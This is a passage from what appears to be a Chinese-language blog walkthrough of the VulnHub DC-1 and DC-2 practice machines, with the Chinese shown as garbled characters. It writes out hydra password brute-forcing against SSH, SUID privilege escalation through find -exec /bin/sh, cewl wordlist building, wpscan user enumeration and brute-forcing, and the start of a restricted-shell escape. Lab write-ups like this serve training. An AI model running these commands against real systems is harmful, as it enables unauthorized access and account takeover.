<p>æ„æ€æ˜¯ï¼šSpecial PERMSç‰¹åˆ«çš„æƒé™ï¼ˆåº”è¯¥æ˜¯rootæƒé™ï¼‰ï¼Œpasswdåº”è¯¥æ˜¯æŸ¥çœ‹&#x2F;etc&#x2F;passwdç›®å½•ï¼ŒFINDæ„æ€åˆ©ç”¨findå‘½ä»¤ï¼Œ-execå°±æ˜¯éœ€è¦ç”¨å®ƒæ‰§è¡Œå‘½ä»¤ï¼Œ get whatâ€™s in the shadowæ„æ€æ˜¯flag4åœ¨&#x2F;etc&#x2F;shadowé‡Œ</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>etc</code>ç›®å½•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></p>
<p>å‘ç°äº†<code>passwd</code>æ–‡ä»¶</p>
<blockquote>
<p>è¾“å…¥<code>cat passwd</code></p>
</blockquote>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<p>å‘ç°æœ‰<code>flag4</code>çš„çº¿ç´¢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></p>
<p><code>flag4</code>æ˜¯åœ¨<code>/home/flag4</code>é‡Œé¢ï¼Œæˆ‘ä»¬åˆ°ç›®å½•é‡Œçœ‹çœ‹</p>
<blockquote>
<p>è¾“å…¥<code>cd /home/flag4</code></p>
</blockquote>
<p>å‘ç°æœ‰ä¸ª<code>flag4.txt</code>ï¼ŒæŸ¥çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></p>
<p>å¾—åˆ°<code>flag4</code></p>
<h3><span id="2å®˜æ–¹æ–¹æ³•">2ï¼‰å®˜æ–¹æ–¹æ³•</span></h3><p>ç”¨äº†<code>hydra</code>[ä¹å¤´è›‡]å·¥å…·ï¼Œå¯¹æˆ‘ä»¬åœ¨<code>passwd</code>é‡Œçœ‹åˆ°<code>flag4</code>ç”¨æˆ·è¿›è¡Œçˆ†ç ´</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-læ˜¯æŒ‡å®šç”¨æˆ·æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼Œ-pæ˜¯æŒ‡å®šå¯†ç æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œsshå°±æ˜¯<br>ç”¨æˆ·æ‰€åœ¨çš„ç½‘ç«™</p>
<p>ä¸Šé¢-pçš„æ–‡ä»¶æ˜¯è‡ªå·±ä¸‹è½½çš„å¯†ç åŒ…</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>è¿™é‡Œå°±çœ‹åˆ°<code>flag4</code>ç”¨æˆ·çš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯<code>orange</code></p>
<p>ç„¶åç”¨<code>ssh</code>è¿æ¥</p>
<blockquote>
<p>è¾“å…¥<code>ssh flag4@192.168.133.136</code><br>ç„¶åyes<br>ç„¶åè¾“å…¥å¯†ç ï¼š<code>orange</code></p>
</blockquote>
<p>è¿›å…¥<code>flag4</code>ç”¨æˆ·é¡µé¢ï¼Œ</p>
<blockquote>
<p>è¾“å…¥<code>cat flag4.txt</code><br>å¾—åˆ°flag4</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></p>
<hr>
<h2><span id="flag5">Flag5</span></h2><blockquote>
<p>åˆ†æä¸€ä¸‹flag5<br><code>Can you use this same method to find or access the flag in root?</code></p>
<p><code>Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></p>
<p>æ„æ€æ˜¯ï¼šæ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æŸ¥æ‰¾æˆ–è®¿é—®æ ¹ç›®å½•ä¸­çš„æ ‡å¿—å—ï¼Ÿ</p>
<p>å¯èƒ½ä½†ä¹Ÿè®¸è¿™å¹¶ä¸å®¹æ˜“ã€‚ä¹Ÿè®¸æ˜¯è¿™æ ·ï¼Ÿ</p>
</blockquote>
<p><code>root</code>åº”è¯¥å°±æ˜¯éœ€è¦ææƒäº†</p>
<h3><span id="suidææƒ">suidææƒ</span></h3><p><code>linux</code>ææƒæ“ä½œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„<code>WEBéšç¬”</code>é‡Œ<code>suid</code>ææƒï¼Œä¸‹é¢åªè®°å½•æµç¨‹</p>
<blockquote>
<p>è¾“å…¥<code>find / -perm -u=s -type f 2&gt;/dev/null</code>ï¼ŒæŸ¥çœ‹ç›®å½•ä¸‹suidæƒé™æ‰€æœ‰å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</p>
</blockquote>
<p>å‘ç°<code>find</code>ç›®å½•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></p>
<p>äºæ˜¯å¯ä»¥åˆ©ç”¨<code>find</code>è·å–<code>root</code>æƒé™<code>shell</code></p>
<p>ä¸»è¦æ˜¯è¦è®©<code>find</code>å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ‰¾ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å³å¯</p>
<blockquote>
<p>ä»¥åœ¨æ ¹ç›®å½•ä¸ºä¾‹<br>è¾“å…¥<code>find / -name initrd.img -exec &quot;/bin/sh&quot; \;</code></p>
</blockquote>
<p>ææƒæˆåŠŸ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></p>
<p>æˆ‘ä»¬åœ¨<code>flag4</code>é‡ŒçŸ¥é“ï¼Œæœ€åçš„æ——å­åœ¨<code>root</code>ç›®å½•é‡Œ</p>
<blockquote>
<p>è¾“å…¥<code>cd /root;ls -a</code></p>
</blockquote>
<p>å‘ç°<code>thefinalflag.txt</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></p>
<blockquote>
<p><code>Well done!!!!</code></p>
<p><code>Hopefully you&#39;ve enjoyed this and learned some new skills.</code></p>
<p><code>You can let me know what you thought of this little journey</code><br><code>by contacting me via Twitter - @DCAU7</code><br>æ„æ€æ˜¯ï¼š<br>åšå¾—å¥½ï¼ï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢è¿™ä¸€ç‚¹ï¼Œå¹¶å­¦ä¹ äº†ä¸€äº›æ–°æŠ€èƒ½ã€‚</p>
<p>ä½ å¯ä»¥å‘Šè¯‰æˆ‘ä½ å¯¹è¿™æ¬¡å°æ—…è¡Œçš„çœ‹æ³•<br>é€šè¿‡Twitterè”ç³»æˆ‘-@DCAU7 </p>
</blockquote>
<p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1><span id="äºŒ-dc-2åˆçº§">äºŒã€DC-2[åˆçº§]</span></h1><p><strong>five flags</strong></p>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p> å…ˆç”¨<code>nmap</code>æ‰«æä¸€äº›</p>
<blockquote>
<p>è¾“å…¥<code>nmap -p- 192.168.133.138</code></p>
</blockquote>
<p>å‘ç°å†…å®¹å¤ªå°‘äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></p>
<blockquote>
<p>è¾“å…¥<code>nmap -p- 192.168.133.138 -A</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>å‘ç°<code>7744</code>ç«¯å£è¿è¡Œçš„<code>ssh</code>ï¼Œ<code>22</code>ç«¯å£è¢«æ¢äº†</p>
<blockquote>
<p>Sshæ˜¯ä¸€ä¸ªå®‰å…¨çš„è¿œç¨‹ç™»å½•åè®®,å®ƒçš„ç«¯å£å·é»˜è®¤æ˜¯22ç«¯å£</p>
</blockquote>
<blockquote>
<p>SSH ä¸º Secure Shell çš„ç¼©å†™ï¼Œç”± IETF çš„ç½‘ç»œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼›SSH ä¸ºå»ºç«‹åœ¨åº”ç”¨å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ã€‚SSH æ˜¯è¾ƒå¯é ï¼Œä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›å®‰å…¨æ€§çš„åè®®ã€‚åˆ©ç”¨ SSH åè®®å¯ä»¥æœ‰æ•ˆé˜²æ­¢è¿œç¨‹ç®¡ç†è¿‡ç¨‹ä¸­çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚SSHæœ€åˆæ˜¯UNIXç³»ç»Ÿä¸Šçš„ä¸€ä¸ªç¨‹åºï¼Œåæ¥åˆè¿…é€Ÿæ‰©å±•åˆ°å…¶ä»–æ“ä½œå¹³å°ã€‚SSHåœ¨æ­£ç¡®ä½¿ç”¨æ—¶å¯å¼¥è¡¥ç½‘ç»œä¸­çš„æ¼æ´ã€‚SSHå®¢æˆ·ç«¯é€‚ç”¨äºå¤šç§å¹³å°ã€‚å‡ ä¹æ‰€æœ‰UNIXå¹³å°â€”åŒ…æ‹¬HP-UXã€Linuxã€AIXã€Solarisã€Digital UNIXã€Irixï¼Œä»¥åŠå…¶ä»–å¹³å°ï¼Œéƒ½å¯è¿è¡ŒSSHã€‚</p>
</blockquote>
<p>æˆ‘ä»¬è¯•è¯•è®¿é—®æˆ‘ä»¬çš„é¶æœº<code>ip</code>ï¼š<code>192.168.133.138</code></p>
<hr>
<p>ä½†æ˜¯è®¿é—®å¤±è´¥ã€å¦‚æœæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å¿½ç•¥ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè®¿é—®<code>IP</code>çš„æ—¶å€™è¿›è¡Œäº†ä¸€ä¸ªè·³è½¬ï¼Œè·³è½¬åˆ°äº†<code>http://dc-2</code>ï¼Œä¸”æ— æ³•è®¿é—®</p>
<p>æˆ‘çŒœæµ‹æ˜¯<code>hosts</code>æ–‡ä»¶æ²¡æœ‰ä¿®æ”¹ï¼Œæ‰€ä»¥åŸŸåæ— æ³•ç™»å½•</p>
<p>éœ€è¦åœ¨<code>hosts</code>å…¶ä¸­æ·»åŠ åŸŸåï¼š<code>http://dc-2</code>å’Œå…¶ipï¼š<code>192.168.133.138</code>ï¼Œ<code>dns</code>æ‰èƒ½æ­£å¸¸è½¬æ¢</p>
<blockquote>
<p>è¾“å…¥<code>vi /etc/hosts</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></p>
<p>å‘å…¶ä¸­æ·»åŠ </p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></p>
<p>åˆ·æ–°æµè§ˆå™¨ï¼Œå†æ¬¡è®¿é—®<code>192.168.133.138</code>æˆ–<code>http://dc-2</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></p>
<p>æˆåŠŸè¿æ¥</p>
<hr>
<h2><span id="flag1">Flag1</span></h2><p>è¿›å…¥ç½‘é¡µå°±çœ‹åˆ°<code>flag</code>äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></p>
<p>ç‚¹å‡»æ‰“å¼€æŸ¥çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></p>
<blockquote>
<p><code>Flag 1:</code></p>
<p><code>Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.</code></p>
<p><code>More passwords is always better, but sometimes you just canâ€™t win them all.</code></p>
<p><code>Log in as one to see the next flag.</code></p>
<p><code>If you canâ€™t find it, log in as another.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>ä½ é€šå¸¸çš„å¯†ç è¡¨å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œå› æ­¤ï¼Œä¹Ÿè®¸ä½ åªéœ€è¦æˆä¸ºcewlã€‚</p>
<p>å¯†ç è¶Šå¤šè¶Šå¥½ï¼Œä½†æœ‰æ—¶ä½ æ— æ³•èµ¢å¾—æ‰€æœ‰å¯†ç ã€‚</p>
<p>ä½œä¸ºä¸€ä¸ªç™»å½•ä»¥æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ ‡å¿—ã€‚</p>
<p>å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¯·ä½œä¸ºå¦ä¸€ä¸ªç™»å½•</p>
<p>Â·Cewlæ˜¯ä¸€ä¸ªé€šè¿‡æŒ‡å®šurlåŠæ·±åº¦,ä½¿ç”¨çˆ¬è™«æŠ€æœ¯,ç”Ÿæˆå­—å…¸çš„ä¸€ä¸ªå·¥å…·ã€‚</p>
<p>é‚£æˆ‘ä»¬å°±ç”¨cewlå·¥å…·è¯•ä¸€ä¸‹<br>*ä¸ä¼šå·¥å…·ä¸€èˆ¬ç”¨-hå°±å¯ä»¥çŸ¥é“ä½¿ç”¨è¯´æ˜</p>
</blockquote>
<hr>
<h2><span id="flag2">Flag2</span></h2><p>æ ¹æ®<code>flag1</code>ï¼Œæˆ‘ä»¬ç”¨<code>cewl</code>è¯•è¯•ç”Ÿæˆå­—å…¸</p>
<h3><span id="cewl">cewl</span></h3><blockquote>
<p>è¾“å…¥<code>cewl http://dc-2/ &gt;pass.txt</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ<code>pass.txt</code></p>
<blockquote>
<p>è¾“å…¥<code>cat pass.txt</code>ï¼ŒæŸ¥çœ‹å†…å®¹</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>å‘ç°æ˜¯ç”Ÿæˆå¯¹åº”ç½‘ç«™çš„å¯†ç å­—å…¸</p>
<p><code>flag1</code>æ•´ç†ä¿¡æ¯å¥½åƒå·®ä¸å¤šäº†ï¼Œä¸‹é¢æˆ‘ä»¬åˆ©ç”¨<code>dc1</code>æåˆ°çš„<code>wappalyzer</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç½‘é¡µçš„æ¡†æ¶ç»“æ„æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></p>
<p>å‘ç°ç½‘ç«™çš„<code>CMS</code>æ˜¯<code>WordPress</code>ï¼Œè¿˜å¯ä»¥çœ‹åˆ°å®ƒçš„ä¸»é¢˜æ˜¯<code>Twenty Seventeen</code></p>
<p>é‚£<code>wordpress</code>ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥ä¾›æˆ‘ä»¬åˆ©ç”¨å‘¢ï¼Œä¸‹é¢å°±æåŠå¦ä¸€ä¸ªå·¥å…·</p>
<h3><span id="wpscan">wpscan</span></h3><blockquote>
<p><code>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·,å®ƒé‡‡ç”¨Rubyç¼–å†™ èƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´,å…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´</code></p>
</blockquote>
<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹æ€§å¯¹wordpressè¿›è¡Œæ¸—é€çœ‹çœ‹ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p>
<blockquote>
<p>è¾“å…¥<code>wpscan --url http://dc-2 -e u</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>ç„¶åå¾€ä¸‹çœ‹ç”¨æˆ·å</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªï¼Œç„¶åå¯ä»¥å¤åˆ¶ä¸‹æ¥ï¼Œå¼„ä¸€ä¸ªç”¨æˆ·åçš„æ–‡æœ¬ï¼Œå’Œä¹‹å‰çš„<code>pass.txt</code>è¿™ä¸ªå¯†ç æœ¬ä¸€æ ·</p>
<blockquote>
<p>è¾“å…¥<code>vi un.txt</code></p>
<p>æŠŠ<code>admin</code> <code>jerry</code> <code>tom</code>å¤åˆ¶è¿›å»</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>ç„¶åå°±å¯ä»¥ç»“åˆæˆ‘ä»¬çš„å¯†ç æ–‡æœ¬å’Œç”¨æˆ·åæ–‡æœ¬ï¼Œåˆ©ç”¨<code>wpscan</code>è¿™ä¸ªå·¥å…·ï¼Œè¿›è¡Œçˆ†ç ´æ“ä½œäº†</p>
<blockquote>
<p>è¾“å…¥<code>wpscan --url http://dc-2 -P pass.txt -U un.txt</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>ç¨å¾®ç­‰ä¸€ä¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p><code>admin</code>ç”¨æˆ·å¯†ç æ²¡æœ‰æ‰¾åˆ°ï¼Œåº”è¯¥æ˜¯æœ€é«˜æƒé™çš„è´¦å·</p>
<p>ä½†æ˜¯<code>jerry</code>å’Œ<code>tom</code>ç”¨æˆ·çš„å¯†ç å·²ç»çŸ¥é“äº†</p>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬å°±è¦å¼€å§‹æ‰¾ç™»å½•çš„é¡µé¢äº†ï¼Œä¸€èˆ¬æ˜¯åå°ç½‘ç«™</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨<code>dirsearch</code>å·¥å…·è¿›è¡Œæ‰«æçœ‹çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></p>
<p>å‘ç°ç½‘ç«™</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p>
<p>ç”¨æˆ‘ä»¬ä¹‹å‰è·å¾—çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•è¯•è¯•</p>
<p>ä»¥<code>jerry</code>ä¸ºä¾‹ï¼Œå¥½åƒç”¨<code>tom</code>ä¼šæ˜¾ç¤ºå¯†ç é”™è¯¯</p>
<p>åœ¨<code>page</code>çª—å£å‘ç°<code>flag2</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></p>
<p>ç‚¹å¼€æŸ¥çœ‹ï¼Œå¾—åˆ°flag2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></p>
<blockquote>
<p><code>Flag 2:</code></p>
<p><code>If you can&#39;t exploit WordPress and take a shortcut, there is another way.</code></p>
<p><code>Hope you found another entry point.</code><br>æ„æ€æ˜¯ï¼š<br>å¦‚æœä½ ä¸èƒ½åˆ©ç”¨WordPresså¹¶èµ°æ·å¾„ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ã€‚</p>
<p>å¸Œæœ›ä½ èƒ½æ‰¾åˆ°å¦ä¸€ä¸ªåˆ‡å…¥ç‚¹ã€‚ </p>
</blockquote>
<hr>
<h2><span id="flag3">Flag3</span></h2><p>æ ¹æ®<code>flag2</code>çš„æç¤ºï¼Œå®é™…ä¸Šå°±æ˜¯è¯´ä»<code>wordpress</code>è¿™æ¡è·¯æ˜¯è¡Œä¸é€šçš„ï¼Œè¦ä»å¦å¤–çš„æ–¹å‘</p>
<p>ä½†æ˜¯å¦‚æœ<code>wordpress</code>è¡Œä¸é€šï¼Œè€Œè¿™ä¸ªç½‘ç«™å°±æ˜¯<code>wordpress</code>æ­å»ºèµ·æ¥çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç½‘ç«™çš„å°±ä¸èƒ½ä¸‹æ‰‹</p>
<p>è™½ç„¶ç½‘ç«™çš„<code>80</code>ç«¯å£çš„<code>http</code>è¡Œä¸é€š</p>
<p>ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰ç”¨<code>nmap</code>æ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°ç«¯å£<code>7744</code>è¿è¡Œç€<code>ssh</code>ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½åˆ©ç”¨<code>ssh</code>ç™»å½•æˆåŠŸå‘¢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>æˆ‘ä»¬å…ˆç”¨ä¹‹å‰ç”¨è¿‡çš„å·¥å…·<code>hydra</code>è¿›è¡Œçˆ†ç ´ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™ä¸ª<code>ssh</code>çš„ç”¨æˆ·æ˜¯è°</p>
<blockquote>
<p>è¾“å…¥<code>hydra -l un.txt -P pass.txt 192.168.133.138 ssh -s 7744</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></p>
<p>å‘ç°<code>tom</code>è´¦å·æ˜¯åœ¨è¿™é‡Œç™»å½•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></p>
<p>ç™»å½•æˆåŠŸåï¼Œ<code>ls</code>å‘ç°<code>flag3.txt</code></p>
<blockquote>
<p>è¾“å…¥<code>cat flag3.txt</code>ï¼ŒæŸ¥çœ‹å†…å®¹</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></p>
<p>å‘ç°æ²¡æœ‰è¯¥å‘½ä»¤ï¼Œé‚£å°±å¯èƒ½æ˜¯æ²¡æœ‰æƒé™æ‰§è¡Œè¿™ä¸ªå‘½ä»¤äº†</p>
<h3><span id="rbash">rbash</span></h3><p>çœ‹åˆ°<code>rbash</code>ï¼Œä¸è®¤è¯†ï¼ŒæŸ¥ä¸€ä¸‹</p>
<blockquote>
<p><code>rbash</code><br>å®ƒä¸ä¸€èˆ¬shellçš„åŒºåˆ«åœ¨äºä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œ</p>
</blockquote>
<p>çœ‹æ¥æ˜¯é™åˆ¶äº†æˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¾—çŸ¥é“æˆ‘ä»¬ç›®å‰è¿˜èƒ½ç”¨é‚£äº›å‘½ä»¤ï¼Œä¹‹å‰ä½¿ç”¨è¿‡<code>ls</code>ï¼Œæ‰€ä»¥<code>ls</code>å¯ä»¥ä½¿ç”¨</p>
<blockquote>
<p>è¾“å…¥<code>ls /home/tom/usr/bin</code>   </p>
<p>&#x2F;&#x2F;æŸ¥çœ‹rbashè®¾ç½®çš„å¯æ‰§è¡Œçš„å‘½ä»¤</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure>

